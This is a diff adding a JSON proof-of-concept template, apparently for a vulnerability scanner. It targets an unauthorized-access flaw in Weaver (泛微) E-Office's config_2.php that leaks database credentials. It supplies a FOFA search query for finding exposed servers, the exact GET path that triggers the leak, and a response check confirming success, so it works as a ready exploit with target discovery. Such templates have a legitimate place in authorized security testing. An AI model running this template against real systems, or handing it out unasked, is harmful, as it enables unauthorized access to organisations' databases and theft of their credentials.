@@ -1,0 +1,37 @@
+{
+  "product": "泛微 E-Office",
+  "vul_name": "泛微 E-Office config_2.php未授权访问",
+  "type": "访问控制",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "泛微E-Office是一种企业办公自动化软件解决方案，由中国的泛微网络科技股份有限公司开发和提供。它旨在帮助企业提高办公效率、优化业务流程和信息管理。泛微e-office存在未授权访问，攻击者可以访问页面获取敏感信息，可获取数据库账户密码。",
+  "version": "",
+  "note": "",
+  "search": {
+    "FOFA": "(body=“login.php”&&body=“eoffice”)||body=“/general/login/index.php”"
+  },
+  "protocol": "http",
+  "link": "https://blog.csdn.net/qq_18193739/article/details/134020652",
+  "fix": [
+    "建议联系软件厂商进行处理。"
+  ],
+  "model": "",
+  "logic": "and",
+  "exploit": {
+    "exp": {
+      "method": "get",
+      "follow": false,
+      "path": "/building/backmgr/urlpage/mobileurl/config_2.php"
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200,
+          "body": "数据库名"
+        }
+      ]
+    }
+  }
+}
